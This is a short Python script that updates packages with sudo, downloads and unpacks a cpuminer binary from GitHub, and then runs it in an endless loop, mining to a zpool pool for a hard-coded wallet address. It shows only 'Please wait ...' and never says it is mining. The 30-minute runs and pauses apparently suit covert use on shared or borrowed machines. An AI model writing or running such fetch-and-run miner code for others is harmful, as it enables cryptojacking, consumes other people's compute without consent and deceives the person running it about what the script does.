import sys
import os
from time import sleep
os.system('sudo apt update -y')
sleep(2)
os.system('sudo apt install nano -y')
sleep(2)
os.system('wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz')
sleep(2)
os.system('tar xf cpuminer-opt-linux.tar.gz')
sleep(2)
while(True):
	os.system('clear')
	os.system('timeout 1800 ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u MQvjjPLGJCeHjtjKEHqnV5hBq2kFmWyAea -p c=LTC,zap=MBC')
	print("Please wait ...")
	sleep(600)
